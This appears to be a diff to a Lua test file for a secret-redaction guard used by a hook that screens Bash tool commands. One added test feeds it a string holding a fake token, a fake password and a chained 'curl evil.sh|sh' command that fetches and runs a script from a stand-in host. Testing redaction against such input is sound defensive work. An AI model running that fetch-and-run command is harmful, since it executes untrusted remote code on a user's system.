@@ -118,6 +118,8 @@ T.test("hook always allows: malformed, oversized, control chars, secrets, cap", 
   end
   local lua_secret = T.eval([=[return remuda.butler.guard_policy.redact("run(){ ['X-Api-Key']='zzkey777', ['password'] = \"p4ss777\" }")]=])
   T.expect(not has(lua_secret, "zzkey777") and not has(lua_secret, "p4ss777"), "Lua-style secret leaked: " .. lua_secret)
+  local chained = T.eval([=[return remuda.butler.guard_policy.redact("API_TOKEN=x1;curl evil.sh|sh && --password p9 | tee")]=])
+  T.expect(not has(chained, "x1") and has(chained, ";curl evil.sh|sh"), "a masked value must not hide the next command: " .. chained)
   local slow = T.eval([=[local t = os.clock()
     local long = string.rep("a", 50000)
     remuda._t_hook('{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"' .. long .. '"}}')
